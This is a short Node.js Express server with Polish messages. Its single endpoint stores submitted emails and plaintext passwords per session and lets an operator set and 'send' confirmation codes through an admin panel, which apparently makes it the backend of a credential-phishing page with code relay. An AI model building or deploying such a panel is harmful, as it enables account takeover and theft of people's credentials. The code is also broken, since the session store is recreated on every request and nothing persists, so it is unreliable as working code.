// server.js - PROSTA WERSJA
const express = require('express');
const app = express();

app.use(express.json());
app.use(express.static('.'));

// API
app.all('/api/confirm', (req, res) => {
    let sessions = {};
    
    if (req.method === 'GET') {
        const session = req.query.session;
        const list = req.query.list;

        if (list === 'true') {
            const active = Object.keys(sessions)
                .filter(k => sessions[k].active !== false)
                .map(k => ({
                    session: k,
                    email: sessions[k].email || 'brak',
                    code: sessions[k].code || '--',
                    sent: sessions[k].sent || false
                }));
            return res.json({ sessions: active });
        }

        if (session) {
            const data = sessions[session] || { code: '--' };
            return res.json({ code: data.code || '--' });
        }

        return res.status(400).json({ error: 'Brak parametru' });
    }

    if (req.method === 'POST') {
        const { action, session, email, password, code } = req.body;

        if (action === 'create') {
            sessions[session] = {
                email: email || 'brak',
                password: password || 'brak',
                code: '--',
                sent: false,
                active: true,
                created: new Date().toISOString()
            };
            return res.json({ success: true, session });
        }

        if (action === 'set_code') {
            if (!sessions[session]) {
                return res.status(404).json({ error: 'Sesja nie istnieje' });
            }
            sessions[session].code = code;
            sessions[session].sent = false;
            return res.json({ success: true, code });
        }

        if (action === 'send_code') {
            if (!sessions[session]) {
                return res.status(404).json({ error: 'Sesja nie istnieje' });
            }
            sessions[session].sent = true;
            return res.json({ success: true, sent: true });
        }

        return res.status(400).json({ error: 'Nieznana akcja' });
    }

    res.status(405).json({ error: 'Method not allowed' });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`✅ Server running on port ${PORT}`);
    console.log(`📱 Admin panel: /admin.html`);
    console.log(`🎫 User page: /`);
});
